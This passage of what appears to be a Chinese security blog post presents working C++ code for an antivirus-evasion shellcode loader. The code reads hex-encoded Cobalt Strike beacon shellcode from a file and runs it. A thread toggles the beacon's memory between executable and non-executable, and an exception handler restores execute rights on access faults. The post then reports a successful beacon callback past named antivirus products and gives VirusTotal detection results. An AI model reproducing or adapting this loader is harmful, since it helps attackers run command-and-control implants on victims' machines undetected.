class="built_in">printf</span>(<span class="string">&quot;The Exception Code is :%x\n&quot;</span>, pExcepInfo-&gt;ExceptionRecord-&gt;ExceptionCode);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The Thread Address is :%llx\n&quot;</span>, pExcepInfo-&gt;ContextRecord-&gt;Rip);		   </span><br><span class="line">	<span class="keyword">if</span> (pExcepInfo-&gt;ExceptionRecord-&gt;ExceptionCode == <span class="number">0xc0000005</span> &amp;&amp; <span class="built_in">is_Exception</span>(pExcepInfo-&gt;ContextRecord-&gt;Rip))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Modify the memory attribute to executable\n&quot;</span>);</span><br><span class="line">		<span class="built_in">VirtualProtect</span>(Beacon_address, Beacon_data_len, PAGE_EXECUTE_READWRITE, &amp;Beacon_Memory_address_flOldProtect);</span><br><span class="line">		<span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 线程函数，用于将Beacon的内存属性设置为可读写，即去掉可执行权限</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">Beacon_set_Memory_attributes</span><span class="params">(LPVOID lpParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">WaitForSingleObject</span>(hEvent, INFINITE);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Set Beacon memory attribute unexecutable\n&quot;</span>);</span><br><span class="line">		<span class="built_in">VirtualProtect</span>(Beacon_address, Beacon_data_len, PAGE_READWRITE, &amp;Beacon_Memory_address_flOldProtect);</span><br><span class="line">		<span class="built_in">ResetEvent</span>(hEvent);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将十六进制中的单个字符转换为相应的整数值</span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">char</span> <span class="title">hexCharToByte</span><span class="params">(<span class="type">char</span> character)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (character &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; character &lt;= <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> character - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (character &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; character &lt;= <span class="string">&#x27;f&#x27;</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> character - <span class="string">&#x27;a&#x27;</span> + <span class="number">10</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (character &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; character &lt;= <span class="string">&#x27;F&#x27;</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> character - <span class="string">&#x27;A&#x27;</span> + <span class="number">10</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将十六进制字符串转换成字节型数组</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">hexStringToBytes</span><span class="params">(<span class="type">const</span> std::string&amp; hexString, <span class="type">unsigned</span> <span class="type">char</span>* byteArray, <span class="type">int</span> byteArraySize)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; hexString.<span class="built_in">length</span>(); i += <span class="number">2</span>) &#123;</span><br><span class="line">		byteArray[i / <span class="number">2</span>] = <span class="built_in">hexCharToByte</span>(hexString[i]) * <span class="number">16</span> + <span class="built_in">hexCharToByte</span>(hexString[i + <span class="number">1</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">	</span><br><span class="line">	hEvent = <span class="built_in">CreateEvent</span>(<span class="literal">NULL</span>, TRUE, <span class="literal">false</span>, <span class="literal">NULL</span>); <span class="comment">// 创建事件(一开始无信号)</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">AddVectoredExceptionHandler</span>(<span class="number">1</span>, &amp;FirstVectExcepHandler); <span class="comment">// 添加异常处理函数</span></span><br><span class="line">	</span><br><span class="line">	<span class="built_in">Hook</span>(); <span class="comment">//开始Hook</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//创建线程</span></span><br><span class="line">	HANDLE hThread1 = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, Beacon_set_Memory_attributes, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(hThread1);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="function">std::ifstream <span class="title">file</span><span class="params">(<span class="string">&quot;beacon_hex.txt&quot;</span>)</span></span>;  <span class="comment">//打开指定文件</span></span><br><span class="line">	<span class="type">size_t</span> size;  <span class="comment">//定义文件内容的字节数</span></span><br><span class="line">	string contents; <span class="comment">//定义文件内容</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//判断文件是否打开成功</span></span><br><span class="line">	<span class="keyword">if</span> (file.<span class="built_in">is_open</span>()) &#123;</span><br><span class="line">		std::stringstream buffer; <span class="comment">//创建一个stringstream对象</span></span><br><span class="line">		buffer &lt;&lt; file.<span class="built_in">rdbuf</span>();  <span class="comment">//将文件的内容复制到该流中</span></span><br><span class="line">		contents = buffer.<span class="built_in">str</span>();  <span class="comment">//将stringstream对象的内容转换string,并将其存储在contents中</span></span><br><span class="line"></span><br><span class="line">		size = contents.<span class="built_in">length</span>() / <span class="number">2</span>;  <span class="comment">//由于两个十六进制相当于一个字节,因此文件内容长度需除以2</span></span><br><span class="line">		file.<span class="built_in">close</span>();  <span class="comment">//关闭文件</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 为shellcode申请一块内存</span></span><br><span class="line">	shellcode_addr = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, size, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 调用函数将十六进制字符串转换为字节型数组</span></span><br><span class="line">	<span class="built_in">hexStringToBytes</span>(contents, (<span class="type">unsigned</span> <span class="type">char</span> *)shellcode_addr, size);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 修改内存属性为可读写</span></span><br><span class="line">	<span class="built_in">VirtualProtect</span>(shellcode_addr, size, PAGE_EXECUTE_READWRITE, &amp;Beacon_Memory_address_flOldProtect);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 执行shellcode</span></span><br><span class="line">	(*(<span class="built_in">int</span>(*)()) shellcode_addr)();</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 解除Hook</span></span><br><span class="line">	<span class="built_in">UnHook</span>();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h2><p>打开Cobalt Strike生成Raw格式的shellcode文件，注意要选择Stageless</p>
+<p><img src="/%E5%88%A9%E7%94%A8%E5%BC%82%E5%B8%B8%E5%AE%9E%E7%8E%B0%E5%85%8D%E6%9D%80/image-20230621224537305.png" alt="image-20230621224537305">	</p>
+<p>使用<code>BinToHex.py</code>将bin文件转为存放16进制字符串的文本文件，并将其与可执行文件放在同一目录</p>
+<p><img src="/%E5%88%A9%E7%94%A8%E5%BC%82%E5%B8%B8%E5%AE%9E%E7%8E%B0%E5%85%8D%E6%9D%80/image-20230621224842193-16873589242881.png" alt="image-20230621224842193">	</p>
+<p>运行可执行程序后，cs成功显示上线，数字杀软也没有报毒，在程序的控制台输出可以看到，分配了两段内存，第一段内存是为储存shellcode分配的，第二段是执行shellcode后它自己分配的，后续会将第一段内存给释放掉，然后修改第二段内存的属性来绕过杀软</p>
+<p><img src="/%E5%88%A9%E7%94%A8%E5%BC%82%E5%B8%B8%E5%AE%9E%E7%8E%B0%E5%85%8D%E6%9D%80/image-20230621225435343.png" alt="image-20230621225435343"></p>
+<p>我测试了下，某绒和数字杀软都能上线并执行命令，卡巴斯基之前是可以过的，但现在不行了。WindowsDefend也能上线，但是第二次回连被检测出了CS流量特征，以下是VT的杀毒查杀率</p>
+<p><img src="/%E5%88%A9%E7%94%A8%E5%BC%82%E5%B8%B8%E5%AE%9E%E7%8E%B0%E5%85%8D%E6%9D%80/image-20230621230053519.png" alt="image-20230621230053519">	</p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
+<li><p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/783">https://forum.butian.net/share/783</a>	</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9399">https://xz.aliyun.com/t/9399</a></p>
+</li>
+</ul>
+
+      </section>
+
+      
+      
+        <nav class="article-nav">
+          
+            <div class="article-nav-item layout-padding">
+  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
+    
+    <div class="card-text">
+      
+        <a href="/2023/10/22/%E5%85%8D%E6%9D%80%E7%AC%94%E8%AE%B0/AntiAntiVirusNotes-master/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">(no title)</h2>
+        </a>
+      
+      <div class="card-text--row">Newer</div>
+    </div>
+  </article>
+</div>
+          
+          
+            <div class="article-nav-item layout-padding">
+  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
+    
+    <div class="card-text">
+      
+        <a href="/2023/10/22/%E5%85%8D%E6%9D%80%E7%AC%94%E8%AE%B0/AntiAntiVirusNotes-master/Webshell%E4%B8%93%E9%A2%98/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">(no title)</h2>
+        </a>
+      
+      <div class="card-text--row">Older</div>
+    </div>
+  </article>
+</div>
+          
+        </nav>
+      
+
+      <section class="page-message-container layout-padding">
+        
+
+
+  
+  
+
+  
+  
+
+
+      </section>
+    </div>
+    <div class="widget-info">
+      <section class="widget-author widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-body">
+    
+      <img src="https://s.gravatar.com/avatar/2d6b803eea37de0257620d5fabee7e64?s=200&amp;r=g&amp;d=retro" class="soft-size--round soft-style--box" alt="Sukoshi">
+    
+    
+      <h2>Sukoshi</h2>
+    
+    
+      <p>贵在坚持</p>
+    
+
+    <div class="count-box">
+      <div class="count-box--item">
+        <svg class="icon icon-article" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M240.51564747 647.74217627h196.07203239c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806V165.10332731c0-33.18142087-30.16492806-60.32985613-60.32985612-60.32985611H245.04038668C225.43318342 104.7734712 210.35071939 119.85593522 210.35071939 139.46313845V617.57724821c0 16.59071043 13.57421762 30.16492806 30.16492808 30.16492806z m663.62841731-452.47392089v482.63884894c0 33.18142087-27.14843525 60.32985613-60.32985612 60.32985613H180.18579134c-33.18142087 0-60.32985613-27.14843525-60.32985612-60.32985613V195.26825538c-49.77213131 0-90.49478418 40.72265287-90.49478417 90.49478417v452.4739209c0 49.77213131 40.72265287 90.49478418 90.49478417 90.49478417h286.56681657c16.59071043 0 30.16492806 13.57421762 30.16492807 30.16492807s13.57421762 30.16492806 30.16492805 30.16492806h90.49478418c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806s13.57421762-30.16492806 30.16492807-30.16492807h286.56681657c49.77213131 0 90.49478418-40.72265287 90.49478417-90.49478417V285.76303955c0-49.77213131-40.72265287-90.49478418-90.49478417-90.49478417zM587.41232014 647.74217627h191.54729318c19.60720323 0 34.68966726-15.08246403 34.68966729-34.68966727V134.93839925c0-16.59071043-13.57421762-30.16492806-30.16492808-30.16492805H617.57724821c-30.16492806 0-60.32985613 27.14843525-60.32985612 60.32985611v452.4739209c0 16.59071043 13.57421762 30.16492806 30.16492805 30.16492806z" fill="currentColor"></path>
+</svg>
+        <span>42</span>
+      </div>
+      <div class="count-box--item">
+        <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
+</svg>
+        0
+      </div>
+      <div class="count-box--item">
+        <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
+</svg>
+        3
+      </div>
+    </div>
+  </div>
+</section>
+
+      
+
+      
+<section class="widet-notice widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-notice" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M512 945.02305225v28.15620663a24.27259221 24.27259221 0 0 1-24.27259221 24.27259335H394.0352a48.54518557 48.54518557 0 0 1-41.74885888-23.78714112l-110.68302222-184.47170332a132.04290333 132.04290333 0 0 1-17.47626667-48.54518557h118.4502511a200.97706667 200.97706667 0 0 1 76.21594113 14.56355556l20.38897777 133.49925888a48.54518557 48.54518557 0 0 0 36.40888888 27.67075555l16.01991111 2.91271112a24.27259221 24.27259221 0 0 1 20.38897778 25.72894889zM997.45185223 463.45481443a194.18074112 194.18074112 0 0 1-38.8361489 116.50844445 24.75804445 24.75804445 0 0 1-36.4088889 0l-34.95253333-34.95253333a24.27259221 24.27259221 0 0 1-2.91271111-30.58346667 97.09036999 97.09036999 0 0 0 0-106.79940665 24.27259221 24.27259221 0 0 1 2.91271111-30.58346666l34.95253333-34.95253334a24.75804445 24.75804445 0 0 1 18.93262223-7.28177777 26.2144 26.2144 0 0 1 17.47626667 9.70903665A194.18074112 194.18074112 0 0 1 997.45185223 463.45481443z m-194.18074112-388.36148111v776.72296335a48.54518557 48.54518557 0 0 1-48.54518556 48.54518443h-28.64165888a48.54518557 48.54518557 0 0 1-33.98163001-14.07810332l-145.63555556-143.20829668A291.27111111 291.27111111 0 0 0 342.57730333 657.63555556H172.18370333a145.63555556 145.63555556 0 0 1-145.63555556-145.63555556v-97.09036999a145.63555556 145.63555556 0 0 1 145.63555556-145.63555556h170.3936a291.27111111 291.27111111 0 0 0 206.31703779-85.43952668l145.63555555-143.20829554a48.54518557 48.54518557 0 0 1 33.98162888-14.07810446H754.72592555a48.54518557 48.54518557 0 0 1 48.54518556 48.54518555z" fill="currentColor"></path>
+</svg>
+    <span>NOTICE</span>
+  </div>
+  <div class="widget-body">
+    <p>flex-block主题部分重构，详情查看https://github.com/miiiku/flex-block</p>
+  </div>
+</section>
+
+
+      <section class="widget-categorys widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
+</svg>
+    <span>CATEGORYS</span>
+  </div>
+  <div class="widget-body">
+    <ul class="categorys-list">
+      
+    </ul>
+  </div>
+</section>
+
+      <section class="widget-tags widget-item  layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
+</svg>
+    <span>TAGS</span>
+  </div>
+  <div class="widget-body">
+    <div class="tags-cloud">
+      <a href="/tags/Hexo/" style="font-size: 10px;" class="tags-cloud-0">Hexo</a> <a href="/tags/Markdown/" style="font-size: 10px;" class="tags-cloud-0">Markdown</a> <a href="/tags/%E7%BD%91%E7%AB%99/" style="font-size: 10px;" class="tags-cloud-0">网站</a>
+    </div>
+  </div>
+</section>
+    </div>
+  </article>
+</div>
+
+    <!-- footer container -->
+<footer id="footer" class="footer">
+  <div class="footer-container">
+    
+    <div class="social-icons">
+      
+        
+      
+        
+      
+        
+      
+        
+          <a href="https://github.com/miiiku/" class="soft-size--primary soft-style--box" target="_blank" rel="noopener noreferrer">
+            <svg class="icon icon-github" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M64.6 512c0 195.6 125.4 361.9 300.1 422.9 23.5 5.9 19.9-10.8 19.9-22.2v-77.6c-135.8 15.9-141.3-74-150.5-89-18.5-31.5-61.9-39.5-49-54.5 31-15.9 62.5 4 98.9 58 26.4 39.1 77.9 32.5 104.1 26 5.7-23.5 17.9-44.5 34.7-60.9-140.7-25.2-199.4-111.1-199.4-213.3 0-49.5 16.4-95.1 48.4-131.8-20.4-60.6 1.9-112.4 4.9-120.1 58.2-5.2 118.5 41.6 123.3 45.3 33.1-8.9 70.8-13.7 112.9-13.7 42.4 0 80.3 4.9 113.5 13.9 11.3-8.6 67.3-48.8 121.4-43.9 2.9 7.7 24.7 58.3 5.5 118.1 32.5 36.8 49 82.8 49 132.4 0 102.3-59 188.3-200.2 213.2 23.5 23.3 38.1 55.5 38.1 91.1v112.7c0.8 9 0 17.9 15.1 17.9C832.7 877 960.4 709.4 960.4 512.1c0-247.5-200.6-447.9-447.9-447.9C265 64.1 64.6 264.5 64.6 512z"></path>
+</svg>
+          </a>
+        
+      
+        
+          <a href="https://twitter.com/guanquanhong" class="soft-size--primary soft-style--box" target="_blank" rel="noopener noreferrer">
+            <svg class="icon icon-twitter" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M962.285714 233.142857q-38.285714 56-92.571429 95.428571 0.571429 8 0.571429 24 0 74.285714-21.714286 148.285714t-66 142-105.428571 120.285714-147.428571 83.428571-184.571429 31.142857q-154.857143 0-283.428571-82.857143 20 2.285714 44.571429 2.285714 128.571429 0 229.142857-78.857143-60-1.142857-107.428571-36.857143t-65.142857-91.142857q18.857143 2.857143 34.857143 2.857143 24.571429 0 48.571429-6.285714-64-13.142857-106-63.714286t-42-117.428571l0-2.285714q38.857143 21.714286 83.428571 23.428571-37.714286-25.142857-60-65.714286t-22.285714-88q0-50.285714 25.142857-93.142857 69.142857 85.142857 168.285714 136.285714t212.285714 56.857143q-4.571429-21.714286-4.571429-42.285714 0-76.571429 54-130.571429t130.571429-54q80 0 134.857143 58.285714 62.285714-12 117.142857-44.571429-21.142857 65.714286-81.142857 101.714286 53.142857-5.714286 106.285714-28.571429z"></path>
+</svg>
+          </a>
+        
+      
+    </div>
+     
+    <p>&copy; 2023 <a href="/" target="_blank">John Doe</a></p>
+
+    
+
+    <p>Powered by <a href="https://hexo.io" target="_blank" rel="noopener noreferrer">Hexo</a> Theme - <a href="https://github.com/miiiku/flex-block" target="_blank" rel="noopener noreferrer author">flex-block</a></p>
+
+    <p>
+      <a href="javascript:;" id="theme-light">🌞 浅色</a>
+      <a href="javascript:;" id="theme-dark">🌛 深色</a>
+      <a href="javascript:;" id="theme-auto">🤖️ 自动</a>
+    </p>
+  </div>
+</footer>
+  </div>
+
+  <div class="back-to-top-fixed soft-size--round soft-style--box">
+    <svg class="icon icon-back-to-top" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+      <path d="M725.333333 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8l-213.333333-213.333333c-17.066667-17.066667-17.066667-42.666667 0-59.733333s42.666667-17.066667 59.733333 0l213.333333 213.333333c17.066667 17.066667 17.066667 42.666667 0 59.733333C746.666667 422.4 738.133333 426.666667 725.333333 426.666667z"></path>
+      <path d="M298.666667 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8-17.066667-17.066667-17.066667-42.666667 0-59.733333l213.333333-213.333333c17.066667-17.066667 42.666667-17.066667 59.733333 0s17.066667 42.666667 0 59.733333l-213.333333 213.333333C320 422.4 311.466667 426.666667 298.666667 426.666667z"></path>
+      <path d="M512 896c-25.6 0-42.666667-17.066667-42.666667-42.666667L469.333333 170.666667c0-25.6 17.066667-42.666667 42.666667-42.666667s42.666667 17.066667 42.666667 42.666667l0 682.666667C554.666667 878.933333 537.6 896 512 896z"></path>
+    </svg>
+  </div>
+
+  
+  <!-- aplayer -->
+
+
+<!-- dplayer -->
+
+
+<!-- copy button  -->
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script>
+
+<!-- https://clipboardjs.com/ -->
+
+
+<script type="text/javascript">
+	(function () {
+		function getCodeType (elem) {
+			const classs = Array.from(elem.classList.values());
+			if (classs && classs.length > 1) {
+				return classs[1];
+			}
+			return "plain";
+		}
+
+		window.addEventListener("DOMContentLoaded", () => {
+			const copyBtnClass = "copy-btn";
+			//  instantiate clipboardjs 
+			const clipboard = new ClipboardJS('.' + copyBtnClass);
+
+			clipboard.on('success', function (e) {
+				console.info('Action:', e.action);
+				console.info('Text:', e.text);
+				console.info('Trigger:', e.trigger);
+				if (e.trigger) {
+					e.trigger.classList.add("copied");
+					setTimeout(() => {
+						e.trigger.classList.remove("copied");
+					}, 3000);
+				}
+				e.clearSelection();
+			});
+
+			clipboard.on('error', function (e) {
+				console.error('Action:', e.action);
+				console.error('Trigger:', e.trigger);
+			});
+
+			document.querySelectorAll('figure.highlight').forEach((elem) => {
+				const codeContent = elem.querySelector("td.code");
+				const copyButton = document.createElement('button');
+				copyButton.setAttribute("class", copyBtnClass);
+				copyButton.setAttribute("title", "Copy Code");
+				copyButton.setAttribute("data-clipboard-text", codeContent.innerText);
+				elem.insertBefore(copyButton, elem.children[0]);
+			});
+		})
+	})();
+</script>
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+  
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+  
+  <!-- 尾部用户自定义相关内容 -->
+</body>
+</html>
